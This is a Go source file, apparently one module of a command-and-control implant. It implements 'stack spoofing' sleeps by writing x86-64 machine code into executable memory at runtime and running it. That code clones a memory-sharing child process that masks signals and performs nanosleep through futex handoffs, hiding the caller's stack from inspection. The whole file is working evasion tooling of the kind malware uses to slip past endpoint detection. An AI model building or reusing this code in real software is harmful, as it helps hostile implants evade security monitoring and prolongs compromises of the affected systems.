//go:build linux && amd64

package commands

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

type stackSpoofState struct {
	mu          sync.Mutex
	initialized bool
	childTID    int32
	stubSlice   []byte
	dataSlice   []byte
	stackSlice  []byte
	dataAddr    uintptr
}

var (
	stackSpoof      stackSpoofState
	stackSpoofReady bool
)

const (
	lnxDataOffState    = 0
	lnxDataOffPad0     = 4
	lnxDataOffStackTop = 8
	lnxDataOffSigset   = 16
	lnxDataOffChildTID = 24
	lnxDataOffPad1     = 28
	lnxDataOffTvSec    = 32
	lnxDataOffTvNsec   = 40
	lnxDataBlockSize   = 48
)

const (
	spoofStateIdle  uint32 = 0
	spoofStateSleep uint32 = 1
	spoofStateDone  uint32 = 2
)

func InitStackSpoof() error {
	return stackSpoof.init()
}

func StackSpoofAvailable() bool {
	return stackSpoofReady
}

func StackSpoofSleep(d time.Duration) {
	if !stackSpoofReady {
		time.Sleep(d)
		return
	}
	stackSpoof.sleep(d)
}

func CleanupStackSpoof() {
	stackSpoof.cleanup()
}

func (s *stackSpoofState) init() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.initialized {
		return nil
	}

	pageSize := unix.Getpagesize()

	dataSlice, err := unix.Mmap(-1, 0, pageSize,
		unix.PROT_READ|unix.PROT_WRITE,
		unix.MAP_PRIVATE|unix.MAP_ANON)
	if err != nil {
		return fmt.Errorf("mmap data: %w", err)
	}
	s.dataSlice = dataSlice
	s.dataAddr = uintptr(unsafe.Pointer(&dataSlice[0]))

	stackSize := 64 * 1024
	stackSlice, err := unix.Mmap(-1, 0, stackSize,
		unix.PROT_READ|unix.PROT_WRITE,
		unix.MAP_PRIVATE|unix.MAP_ANON)
	if err != nil {
		unix.Munmap(dataSlice)
		return fmt.Errorf("mmap stack: %w", err)
	}
	s.stackSlice = stackSlice
	stackBase := uintptr(unsafe.Pointer(&stackSlice[0]))
	stackTop := (stackBase + uintptr(stackSize)) &^ 0xF

	data := dataSlice[:lnxDataBlockSize]
	binary.LittleEndian.PutUint32(data[lnxDataOffState:], spoofStateIdle)
	binary.LittleEndian.PutUint64(data[lnxDataOffStackTop:], uint64(stackTop))
	binary.LittleEndian.PutUint64(data[lnxDataOffSigset:], 0xFFFFFFFFFFFFFFFF)

	stub := generateLinuxSleepStub(s.dataAddr)

	stubAllocSize := ((len(stub) + pageSize - 1) / pageSize) * pageSize
	stubSlice, err := unix.Mmap(-1, 0, stubAllocSize,
		unix.PROT_READ|unix.PROT_WRITE,
		unix.MAP_PRIVATE|unix.MAP_ANON)
	if err != nil {
		unix.Munmap(stackSlice)
		unix.Munmap(dataSlice)
		return fmt.Errorf("mmap stub: %w", err)
	}
	copy(stubSlice, stub)
	s.stubSlice = stubSlice

	if err := unix.Mprotect(stubSlice, unix.PROT_READ|unix.PROT_EXEC); err != nil {
		unix.Munmap(stubSlice)
		unix.Munmap(stackSlice)
		unix.Munmap(dataSlice)
		return fmt.Errorf("mprotect stub RX: %w", err)
	}

	stubAddr := uintptr(unsafe.Pointer(&stubSlice[0]))
	runtime.LockOSThread()
	invokeStub(stubAddr)
	runtime.UnlockOSThread()

	s.childTID = int32(binary.LittleEndian.Uint32(data[lnxDataOffChildTID:]))
	if s.childTID <= 0 {
		unix.Munmap(stubSlice)
		unix.Munmap(stackSlice)
		unix.Munmap(dataSlice)
		return fmt.Errorf("clone failed: tid=%d", s.childTID)
	}

	s.initialized = true
	stackSpoofReady = true
	return nil
}

func invokeStub(addr uintptr) {
	codeAddr := addr
	codePtr := &codeAddr
	fn := *(*func())(unsafe.Pointer(&codePtr))
	fn()
}

func (s *stackSpoofState) sleep(d time.Duration) {
	s.mu.Lock()
	if !s.initialized {
		s.mu.Unlock()
		time.Sleep(d)
		return
	}
	data := s.dataSlice[:lnxDataBlockSize]
	futexAddr := uintptr(unsafe.Pointer(&data[lnxDataOffState]))
	s.mu.Unlock()

	sec := int64(d / time.Second)
	nsec := int64(d % time.Second)
	statePtr := (*uint32)(unsafe.Pointer(&data[lnxDataOffState]))

	binary.LittleEndian.PutUint64(data[lnxDataOffTvSec:], uint64(sec))
	binary.LittleEndian.PutUint64(data[lnxDataOffTvNsec:], uint64(nsec))

	atomic.StoreUint32(statePtr, spoofStateSleep)
	futexWake(futexAddr, 1)

	for {
		state := atomic.LoadUint32(statePtr)
		if state == spoofStateDone {
			break
		}
		futexWait(futexAddr, spoofStateSleep)
	}

	atomic.StoreUint32(statePtr, spoofStateIdle)
}

func futexWait(addr uintptr, val uint32) {
	syscall.Syscall6(unix.SYS_FUTEX, addr, 0, uintptr(val), 0, 0, 0)
}

func futexWake(addr uintptr, count int) {
	syscall.Syscall6(unix.SYS_FUTEX, addr, 1, uintptr(count), 0, 0, 0)
}

func (s *stackSpoofState) cleanup() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if !s.initialized {
		return
	}
	stackSpoofReady = false
	s.initialized = false

	if s.childTID > 0 {
		_ = syscall.Kill(int(s.childTID), syscall.SIGKILL)
	}

	_ = unix.Munmap(s.stubSlice)
	_ = unix.Munmap(s.stackSlice)
	_ = unix.Munmap(s.dataSlice)
}

// generateLinuxSleepStub generates x86-64 machine code that:
//  1. Bootstrap (runs on Go thread): clone a child process, return to Go
//  2. Child (separate process, shared address space): reset signal handlers,
//     set PR_SET_PDEATHSIG, then loop: futex_wait → nanosleep → futex_wake
//
// Uses CLONE_VM|CLONE_FS|CLONE_FILES (NOT CLONE_THREAD|CLONE_SIGHAND) to avoid
// sharing Go's signal handler table with the child. The child resets handlers to
// SIG_DFL so faults kill only the child, not the Go process.
func generateLinuxSleepStub(dataAddr uintptr) []byte {
	var code []byte
	buf := make([]byte, 8)

	// === PROLOGUE: save callee-saved registers ===
	code = append(code, 0x55)                   // push rbp
	code = append(code, 0x48, 0x89, 0xE5)       // mov rbp, rsp
	code = append(code, 0x53)                   // push rbx
	code = append(code, 0x41, 0x54)             // push r12
	code = append(code, 0x41, 0x55)             // push r13
	code = append(code, 0x41, 0x56)             // push r14
	code = append(code, 0x41, 0x57)             // push r15

	// Load data block address into r12
	code = append(code, 0x49, 0xBC) // movabs r12, imm64
	binary.LittleEndian.PutUint64(buf, uint64(dataAddr))
	code = append(code, buf...)

	// === CLONE: CLONE_VM|CLONE_FS|CLONE_FILES (0x700) ===
	code = append(code, 0xBF, 0x00, 0x07, 0x00, 0x00) // mov edi, 0x700

	// mov rsi, [r12 + lnxDataOffStackTop]
	code = append(code, 0x49, 0x8B, 0x74, 0x24, byte(lnxDataOffStackTop))

	code = append(code, 0x31, 0xD2)       // xor edx, edx  (parent_tid = NULL)
	code = append(code, 0x4D, 0x31, 0xD2) // xor r10, r10  (child_tid = NULL)
	code = append(code, 0x4D, 0x31, 0xC0) // xor r8, r8    (tls = NULL)

	code = append(code, 0xB8, 0x38, 0x00, 0x00, 0x00) // mov eax, 56 (SYS_clone)
	code = append(code, 0x0F, 0x05)                    // syscall

	code = append(code, 0x48, 0x85, 0xC0) // test rax, rax
	jzOffset := len(code)
	code = append(code, 0x74, 0x00) // jz child_start
	jsOffset := len(code)
	code = append(code, 0x78, 0x00) // js clone_fail

	// === PARENT: store child PID and return ===
	code = append(code, 0x41, 0x89, 0x44, 0x24, byte(lnxDataOffChildTID))

	parentReturnOffset := len(code)
	code = append(code, 0x41, 0x5F) // pop r15
	code = append(code, 0x41, 0x5E) // pop r14
	code = append(code, 0x41, 0x5D) // pop r13
	code = append(code, 0x41, 0x5C) // pop r12
	code = append(code, 0x5B)       // pop rbx
	code = append(code, 0x5D)       // pop rbp
	code = append(code, 0xC3)       // ret

	// === CLONE FAILURE ===
	cloneFailOffset := len(code)
	code = append(code, 0x41, 0x89, 0x44, 0x24, byte(lnxDataOffChildTID))
	code = append(code, 0xEB, byte(parentReturnOffset-(len(code)+2))) // jmp parent_return

	// Patch jz/js
	code[jzOffset+1] = byte(len(code) - (jzOffset + 2))
	code[jsOffset+1] = byte(cloneFailOffset - (jsOffset + 2))

	// === CHILD INIT ===

	// prctl(PR_SET_PDEATHSIG=1, SIGKILL=9) — die when parent dies
	code = append(code, 0xBF, 0x01, 0x00, 0x00, 0x00) // mov edi, 1
	code = append(code, 0xBE, 0x09, 0x00, 0x00, 0x00) // mov esi, 9
	code = append(code, 0x31, 0xD2)                    // xor edx, edx
	code = append(code, 0x4D, 0x31, 0xD2)              // xor r10, r10
	code = append(code, 0x4D, 0x31, 0xC0)              // xor r8, r8
	code = append(code, 0xB8, 0x9D, 0x00, 0x00, 0x00)  // mov eax, 157 (SYS_prctl)
	code = append(code, 0x0F, 0x05)                    // syscall

	// Reset SIGSEGV(11) and SIGBUS(7) handlers to SIG_DFL
	// Build zeroed sigaction struct on stack (32 bytes)
	code = append(code, 0x48, 0x83, 0xEC, 0x20) // sub rsp, 32
	// Zero the 32-byte sigaction: 4x qword stores
	code = append(code, 0x48, 0x31, 0xC0) // xor rax, rax
	code = append(code, 0x48, 0x89, 0x04, 0x24)             // mov [rsp], rax
	code = append(code, 0x48, 0x89, 0x44, 0x24, 0x08)       // mov [rsp+8], rax
	code = append(code, 0x48, 0x89, 0x44, 0x24, 0x10)       // mov [rsp+16], rax
	code = append(code, 0x48, 0x89, 0x44, 0x24, 0x18)       // mov [rsp+24], rax

	// rt_sigaction(SIGSEGV=11, &act, NULL, 8)
	code = append(code, 0xBF, 0x0B, 0x00, 0x00, 0x00) // mov edi, 11
	code = append(code, 0x48, 0x89, 0xE6)              // mov rsi, rsp
	code = append(code, 0x31, 0xD2)                    // xor edx, edx
	code = append(code, 0x41, 0xBA, 0x08, 0x00, 0x00, 0x00) // mov r10d, 8
	code = append(code, 0xB8, 0x0D, 0x00, 0x00, 0x00) // mov eax, 13 (SYS_rt_sigaction)
	code = append(code, 0x0F, 0x05)                    // syscall

	// rt_sigaction(SIGBUS=7, &act, NULL, 8)
	code = append(code, 0xBF, 0x07, 0x00, 0x00, 0x00) // mov edi, 7
	code = append(code, 0x48, 0x89, 0xE6)              // mov rsi, rsp
	code = append(code, 0x31, 0xD2)                    // xor edx, edx
	code = append(code, 0x41, 0xBA, 0x08, 0x00, 0x00, 0x00) // mov r10d, 8
	code = append(code, 0xB8, 0x0D, 0x00, 0x00, 0x00) // mov eax, 13
	code = append(code, 0x0F, 0x05)                    // syscall

	code = append(code, 0x48, 0x83, 0xC4, 0x20) // add rsp, 32

	// Block all other signals
	code = append(code, 0xBF, 0x02, 0x00, 0x00, 0x00) // mov edi, SIG_SETMASK
	code = append(code, 0x49, 0x8D, 0x74, 0x24, byte(lnxDataOffSigset)) // lea rsi, [r12+sigset]
	code = append(code, 0x31, 0xD2)                     // xor edx, edx
	code = append(code, 0x41, 0xBA, 0x08, 0x00, 0x00, 0x00) // mov r10d, 8
	code = append(code, 0xB8, 0x0E, 0x00, 0x00, 0x00)  // mov eax, 14 (SYS_rt_sigprocmask)
	code = append(code, 0x0F, 0x05)                     // syscall

	// === SLEEP LOOP ===
	sleepLoopOffset := len(code)

	// futex_wait(&state, FUTEX_WAIT=0, expected=0, timeout=NULL)
	code = append(code, 0x49, 0x8D, 0x3C, 0x24)              // lea rdi, [r12]
	code = append(code, 0x31, 0xF6)                           // xor esi, esi
	code = append(code, 0x31, 0xD2)                           // xor edx, edx
	code = append(code, 0x4D, 0x31, 0xD2)                     // xor r10, r10
	code = append(code, 0xB8, 0xCA, 0x00, 0x00, 0x00)         // mov eax, 202 (SYS_futex)
	code = append(code, 0x0F, 0x05)                           // syscall

	// Check state
	code = append(code, 0x41, 0x8B, 0x04, 0x24) // mov eax, [r12]
	code = append(code, 0x83, 0xF8, 0x01)       // cmp eax, 1
	jneOffset := len(code)
	code = append(code, 0x75, byte(sleepLoopOffset-(jneOffset+2))) // jne sleep_loop

	// Push timespec on stack
	code = append(code, 0x41, 0xFF, 0x74, 0x24, byte(lnxDataOffTvNsec)) // push [r12+tv_nsec]
	code = append(code, 0x41, 0xFF, 0x74, 0x24, byte(lnxDataOffTvSec))  // push [r12+tv_sec]

	// nanosleep(&ts, NULL)
	code = append(code, 0x48, 0x89, 0xE7)                     // mov rdi, rsp
	code = append(code, 0x31, 0xF6)                           // xor esi, esi
	code = append(code, 0xB8, 0x23, 0x00, 0x00, 0x00)         // mov eax, 35 (SYS_nanosleep)
	code = append(code, 0x0F, 0x05)                           // syscall

	code = append(code, 0x48, 0x83, 0xC4, 0x10) // add rsp, 16

	// state = DONE (2)
	code = append(code, 0x41, 0xC7, 0x04, 0x24, 0x02, 0x00, 0x00, 0x00) // mov dword [r12], 2

	// futex_wake(&state, FUTEX_WAKE=1, count=1)
	code = append(code, 0x49, 0x8D, 0x3C, 0x24)               // lea rdi, [r12]
	code = append(code, 0xBE, 0x01, 0x00, 0x00, 0x00)         // mov esi, 1
	code = append(code, 0xBA, 0x01, 0x00, 0x00, 0x00)         // mov edx, 1
	code = append(code, 0xB8, 0xCA, 0x00, 0x00, 0x00)         // mov eax, 202 (SYS_futex)
	code = append(code, 0x0F, 0x05)                           // syscall

	// jmp sleep_loop
	jmpOffset := len(code)
	code = append(code, 0xE9, 0x00, 0x00, 0x00, 0x00) // jmp rel32
	disp := int32(sleepLoopOffset - (jmpOffset + 5))
	binary.LittleEndian.PutUint32(code[jmpOffset+1:], uint32(disp))

	return code
}
